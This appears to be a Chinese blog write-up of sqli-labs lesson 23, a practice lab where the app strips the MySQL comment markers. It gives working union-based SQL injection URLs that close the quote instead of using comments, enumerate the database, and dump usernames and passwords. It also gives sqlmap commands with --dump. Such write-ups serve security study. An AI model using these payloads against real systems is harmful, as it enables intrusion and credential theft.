---
title: sqli-labs lession 23 GET基于错误的过滤注释
date: 2018-10-03 13:05:05
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession 23 GET基于错误的过滤注释

---

## 登录界面

![001](/img/sql/Lesson-23/001.png)

## 分析

这里对输入的`#`和`-- `的mysql注释方式进行了过滤。都替换成了空。

![002](/img/sql/Lesson-23/002.png)

用`'`发现报错,但是因为过滤了`#`和`-- `只能使用闭合绕过了。

![003](/img/sql/Lesson-23/003.png)

`http://192.168.75.131/sql/Less-23/?id=1' or '1'='1`

![004](/img/sql/Lesson-23/004.png)

## 手注

### 获取字段数

`http://192.168.75.131/sql/Less-23/?id=1' union select null,null,null or '1'='1`

![005](/img/sql/Lesson-23/005.png)

### 获取当前数据库

`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select database()),3 or '1'='1`

![006](/img/sql/Lesson-23/006.png)

### 获取表名

`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1`

![007](/img/sql/Lesson-23/007.png)

### 获取列名

`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 or '1'='1`

![008](/img/sql/Lesson-23/008.png)

### 获取字段值

`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(id,'~',username,'~',password) from security.users),3 or '1'='1`

![009](/img/sql/Lesson-23/009.png)

## SQLMAP

`python sqlmap.py -u "http://192.168.75.131/sql/Less-23/?id=-1' or '1'='1 " --dbms mysql --threads 10 --method GET --technique B `

![010](/img/sql/Lesson-23/010.png)

`python sqlmap.py -u "http://192.168.75.131/sql/Less-23/?id=1" --threads 10 -D security -T users --columns --dump`

![011](/img/sql/Lesson-23/011.png)

